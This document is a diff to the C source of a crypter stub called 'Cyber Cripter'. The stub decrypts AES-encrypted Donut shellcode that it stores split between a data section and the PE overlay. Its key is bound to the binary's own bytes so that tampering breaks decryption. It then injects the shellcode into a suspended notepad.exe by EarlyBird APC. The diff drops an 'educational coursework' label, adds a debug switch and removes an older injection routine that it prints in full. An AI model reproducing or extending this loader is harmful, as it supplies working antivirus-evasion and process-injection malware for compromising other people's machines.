@@ -1,17 +1,17 @@
 /*
- * Cyber Cripter — native stub (educational coursework).
+ * Cyber Cripter — native stub
  *
  * Este binario es la plantilla pre-compilada del loader que el builder C# parchea.
  * El layout en disco, tras el parcheo, es:
  *
- *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
+ *   Sección .cdata (datos const inicializados, mapeados para solo-lectura en runtime):
  *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
  *                      hash_region_size). Localizado via METADATA_MAGIC.
  *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
- *                      del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
+ *                      del código cifrado. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
  *
  *   PE overlay (bytes en bruto tras la última sección del PE):
- *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
+ *     segunda mitad del código cifrado — half2 (tamaño en g_meta.half2_size).
  *
  * Flujo en runtime:
  *   1. Leer el propio fichero desde disco.
@@ -19,7 +19,7 @@
  *         clave = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
  *      Los bytes del stub en el hash actúan como anti-tamper: cualquier modificación
  *      del prefijo hasheado invalida la clave y el descifrado falla.
- *   3. Remontar el ciphertext completo = half1 || half2.
+ *   3. Remontar el código cifrado completo = half1 || half2.
  *   4. Descifrar con AES-256-CBC con padding PKCS#7 -> shellcode (salida de Donut).
  *   5. Inyectar el shellcode mediante EarlyBird APC en un proceso notepad.exe suspendido.
  */
@@ -32,9 +32,16 @@
 
 #pragma comment(lib, "bcrypt.lib")
 
+
+/* Configurar según si se desea que se cree una terminal para debugar, que muestre la información y estado durante todo el proceso o no.
+    0 -> NO DEBUGGING
+    1 -> DEBUGGING */
+#define DEBUGGING 1
+
 /* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (500 KiB).
    Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
 #define HALF1_MAX 0x7D000
+
 
 /* Layout de los metadatos que el builder escribe en .cdata.
    #pragma pack(1) garantiza que no hay padding entre campos, lo cual es imprescindible
@@ -158,7 +165,7 @@ static int read_self(unsigned char **out, DWORD *out_size)
 /* ---------- SHA-256 via CNG ---------- */
 
 /**
- * @brief  Calcula el digest SHA-256 de un buffer usando la API CNG (BCrypt) del sistema.
+ * @brief  Calcula el hash SHA-256 de un buffer usando la API CNG (BCrypt) del sistema.
  *         Se usa para derivar la clave AES-256: SHA256(heap_marker || self[0..hr] || timestamp).
  * @param[in]  in      Buffer de entrada a hashear.
  * @param[in]  in_len  Longitud del buffer de entrada en bytes.
@@ -185,10 +192,11 @@ end:
 /* ---------- descifrado AES-256-CBC con padding PKCS#7 via CNG ---------- */
 
 /**
- * @brief  Descifra un buffer con AES-256-CBC (padding PKCS#7) usando la API BCrypt.
- *         Realiza dos llamadas a BCryptDecrypt: la primera con buffer NULL para obtener
- *         el tamaño exacto del plaintext; la segunda para el descifrado real.
- *         El IV se restaura entre ambas llamadas porque BCryptDecrypt lo muta al avanzar el estado CBC.
+ * @brief   Descifra un buffer con AES-256-CBC (y padding PKCS#7) usando la API BCrypt.
+ *          Realiza dos llamadas a BCryptDecrypt: la primera con buffer NULL para obtener
+ *          el tamaño exacto del plaintext (y poder reservar un buffer de memoria para guardarlo); 
+ *          la segunda para el descifrado real.
+ *          El IV se restaura entre ambas llamadas porque BCryptDecrypt lo modifica en el proceso de Decrypt.
  * @param[in]  key     Clave AES de 32 bytes derivada por SHA-256.
  * @param[in]  iv_in   Vector de inicialización de 16 bytes; se copia internamente, no se modifica.
  * @param[in]  ct      Buffer con el ciphertext a descifrar.
@@ -308,8 +316,7 @@ static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
     }
     printf("[+] APC encolada correctamente\n");
 
-    /* Reanudar el hilo: a partir de aquí el hilo ejecutará la APC (shellcode) en lugar
-       de seguir con la inicialización normal del proceso. */
+    /* Reanudar el hilo: a partir de aquí el hilo ejecutará la APC (shellcode) en lugar de seguir con la inicialización normal del proceso. */
     ResumeThread(pi.hThread);
     printf("[+] Hilo reanudado correctamente\n");
     CloseHandle(pi.hThread);
@@ -317,59 +324,13 @@ static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
     return 1;
 
 fail:
-    /* Si algo falla antes de reanudar, terminar el proceso suspendido para no dejarlo huérfano */
+    /* Si algo falla, antes de reanudar, terminar el proceso suspendido para no dejarlo huérfano */
     TerminateProcess(pi.hProcess, 1);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return 0;
 }
 
-// static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
-// {
-//     STARTUPINFOA        si;
-//     PROCESS_INFORMATION pi;
-//     char target[] = "C:\\Windows\\System32\\notepad.exe";
-//     SIZE_T written = 0;
-//     LPVOID rmem = NULL;
-
-//     xzero(&si, sizeof(si));
-//     xzero(&pi, sizeof(pi));
-//     si.cb = sizeof(si);
-
-//     /* Crear el proceso suspendido */
-//     if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
-//                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;
-
-//     /* Reservar memoria con permisos de solo lectura/escritura */
-//     rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
-//                           MEM_COMMIT | MEM_RESERVE,
-//                           PAGE_READWRITE);
-//     if (!rmem) goto fail;
-
-//     /* Copiar el shellcode al proceso remoto */
-//     if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
-//         || written != sc_len) goto fail;
-
-//     /* Cambiar permisos a ejecutable después de escribir el shellcode */
-//     if (!VirtualProtectEx(pi.hProcess, rmem, sc_len,
-//                           PAGE_EXECUTE_READWRITE, NULL)) goto fail;
-
-//     /* Encolar la APC */
-//     if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;
-
-//     /* Reanudar el hilo */
-//     ResumeThread(pi.hThread);
-//     CloseHandle(pi.hThread);
-//     CloseHandle(pi.hProcess);
-//     return 1;
-
-// fail:
-//     /* Limpiar recursos */
-//     if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
-//     if (pi.hThread) CloseHandle(pi.hThread);
-//     if (pi.hProcess) CloseHandle(pi.hProcess);
-//     return 0;
-// }
 
 /* ----------DEBUG---------*/
 static void init_console(void)
@@ -401,8 +362,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    // UNCOMMENT THIS LINE FOR DEBUGGING
-    init_console();
+    // Si se está debugando se creara una consola CLI para mostrar info
+    if (DEBUGGING) init_console();
 
     /* Paso 1: leer el propio binario desde disco */
     unsigned char *self = NULL;
@@ -418,8 +379,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 
     /* Validar que los metadatos tienen sentido antes de usarlos como índices de memoria */
     if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size || (h1 + h2) < h1) {
-        printf("[-] Error: Datos de metadatos inválidos (hash_region_size=%u, half1_size=%u, half2_size=%u, self_size=%u)\n",
-               hr, h1, h2, self_size);
+        printf("[-] Error: Datos de metadatos inválidos (hash_region_size=%u, half1_size=%u, half2_size=%u, self_size=%u)\n", hr, h1, h2, self_size);
         xfree(self); 
         return 2;
     }
